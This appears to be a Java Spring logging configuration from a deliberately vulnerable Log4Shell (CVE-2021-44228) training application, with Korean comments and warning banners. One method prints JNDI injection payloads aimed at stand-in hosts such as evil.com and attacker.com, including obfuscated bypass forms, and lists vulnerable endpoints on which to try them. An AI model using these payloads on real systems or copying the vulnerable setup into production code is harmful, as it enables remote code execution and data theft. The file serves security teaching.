package com.example.demo.config.logging;

import lombok.extern.log4j.Log4j2;
import org.springframework.context.annotation.Configuration;

import javax.annotation.PostConstruct;

/**
 * 로깅 설정 클래스
 * ⚠️ 취약점 실습을 위해 의도적으로 취약하게 구성됨
 */
@Configuration
@Log4j2
public class LoggingConfig {

    @PostConstruct
    public void initializeLogging() {
        // 🚨 Log4j 취약점: 로깅 시스템 초기화 메시지
        log.info("Log4j vulnerability demo logging system initialized");
        log.warn("⚠️  WARNING: This application uses vulnerable Log4j 2.14.1 for educational purposes");
        log.warn("⚠️  JNDI lookup is ENABLED - DO NOT use in production!");
        
        // 시스템 프로퍼티 로깅
        String formatMsgNoLookups = System.getProperty("log4j2.formatMsgNoLookups", "not set");
        log.info("log4j2.formatMsgNoLookups property: {}", formatMsgNoLookups);
        
        // 🚨 Log4j 버전 정보 로깅
        String log4jVersion = org.apache.logging.log4j.LogManager.class.getPackage().getImplementationVersion();
        log.info("Log4j version: {}", log4jVersion);
        
        if ("2.14.1".equals(log4jVersion)) {
            log.error("🚨 SECURITY ALERT: Running with vulnerable Log4j version {}", log4jVersion);
            log.error("🚨 This version is susceptible to CVE-2021-44228 (Log4Shell)");
            log.error("🚨 JNDI injection attacks are possible!");
        }
        
        // JVM 보안 관련 프로퍼티 로깅
        logSecurityProperties();
        
        // 🚨 실습용 경고 메시지 출력
        displayVulnerabilityWarning();
    }
    
    /**
     * 보안 관련 시스템 프로퍼티 로깅
     */
    private void logSecurityProperties() {
        // JNDI 관련 프로퍼티들
        String[] jndiProperties = {
            "com.sun.jndi.ldap.object.trustURLCodebase",
            "com.sun.jndi.rmi.object.trustURLCodebase",
            "com.sun.jndi.cosnaming.object.trustURLCodebase"
        };
        
        log.info("=== JNDI Security Properties ===");
        for (String property : jndiProperties) {
            String value = System.getProperty(property, "not set");
            log.info("{}: {}", property, value);
            
            if ("true".equals(value)) {
                log.warn("⚠️  {} is set to true - this enables JNDI attacks!", property);
            }
        }
        
        // Log4j 관련 프로퍼티들
        String[] log4jProperties = {
            "log4j2.formatMsgNoLookups",
            "log4j2.enableJndiLookup",
            "log4j2.enableJndiJms",
            "log4j2.enableJndiContextSelector"
        };
        
        log.info("=== Log4j Security Properties ===");
        for (String property : log4jProperties) {
            String value = System.getProperty(property, "not set");
            log.info("{}: {}", property, value);
        }
    }
    
    /**
     * 취약점 실습 관련 경고 메시지 출력
     */
    private void displayVulnerabilityWarning() {
        log.warn("╔══════════════════════════════════════════════════════════════╗");
        log.warn("║                    ⚠️  SECURITY WARNING ⚠️                     ║");
        log.warn("║                                                              ║");
        log.warn("║  This application is configured with VULNERABLE Log4j       ║");
        log.warn("║  for educational purposes only!                             ║");
        log.warn("║                                                              ║");
        log.warn("║  VULNERABLE FEATURES ENABLED:                               ║");
        log.warn("║  • JNDI Lookup: ENABLED                                     ║");
        log.warn("║  • Message Lookups: ENABLED                                 ║");
        log.warn("║  • User Input Logging: NO FILTERING                         ║");
        log.warn("║                                                              ║");
        log.warn("║  🚨 DO NOT USE IN PRODUCTION! 🚨                            ║");
        log.warn("╚══════════════════════════════════════════════════════════════╝");
        
        // 실습 가능한 엔드포인트 안내
        log.info("📚 Available vulnerability endpoints:");
        log.info("   • GET  /api/vulnerable/log-headers");
        log.info("   • POST /api/vulnerable/log-input");
        log.info("   • GET  /api/vulnerable/analyze-search?searchTerm=<payload>");
        log.info("   • POST /api/vulnerable/upload-file");
        log.info("   • GET  /api/boards/search?q=<payload>");
        log.info("   • GET  /api/users/search?q=<payload>");
    }
    
    /**
     * 실습용 JNDI 공격 패턴 로깅 (시작 시 한 번만)
     */
    public void logExampleAttackPatterns() {
        log.info("🎯 Example JNDI attack patterns for educational purposes:");
        
        String[] patterns = {
            "${jndi:ldap://evil.com/exploit}",
            "${jndi:rmi://malicious.server/payload}",
            "${jndi:dns://attacker.com/exfiltrate}",
            "${${lower:jndi}:${lower:ldap}://bypass.com/exploit}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://obfuscated.com/exploit}"
        };
        
        for (int i = 0; i < patterns.length; i++) {
            log.info("   Pattern {}: {}", i + 1, patterns[i]);
        }
        
        log.info("💡 Test these patterns in:");
        log.info("   • HTTP headers (User-Agent, Referer, etc.)");
        log.info("   • Search parameters");
        log.info("   • Form inputs");
        log.info("   • JSON payloads");
    }
    
    /**
     * 로그 레벨별 테스트 메시지 출력
     */
    public void testLogLevels() {
        log.trace("TRACE level logging test - finest granularity");
        log.debug("DEBUG level logging test - debugging information");
        log.info("INFO level logging test - general information");
        log.warn("WARN level logging test - warning messages");
        log.error("ERROR level logging test - error conditions");
        
        // 🚨 취약점 테스트: 각 레벨에서 JNDI 패턴 로깅
        String testPayload = "${jndi:ldap://test.example.com/LogLevelTest}";
        log.trace("TRACE with payload: {}", testPayload);
        log.debug("DEBUG with payload: {}", testPayload);
        log.info("INFO with payload: {}", testPayload);
        log.warn("WARN with payload: {}", testPayload);
        log.error("ERROR with payload: {}", testPayload);
    }
    
    /**
     * 로깅 시스템 상태 체크
     */
    public void checkLoggingSystemStatus() {
        log.info("=== Logging System Status Check ===");
        
        // LoggerContext 정보
        org.apache.logging.log4j.core.LoggerContext context = 
            (org.apache.logging.log4j.core.LoggerContext) org.apache.logging.log4j.LogManager.getContext(false);
        
        log.info("Logger Context: {}", context.getName());
        log.info("Configuration Source: {}", context.getConfigLocation());
        log.info("Configuration Name: {}", context.getConfiguration().getName());
        
        // 활성화된 Appender 목록
        context.getConfiguration().getAppenders().forEach((name, appender) -> {
            log.info("Active Appender: {} ({})", name, appender.getClass().getSimpleName());
        });
        
        // 활성화된 Logger 목록
        context.getLoggers().forEach(logger -> {
            if (logger.getName().startsWith("com.example.demo")) {
                log.info("Application Logger: {} (Level: {})", 
                        logger.getName(), logger.getLevel());
            }
        });
    }
}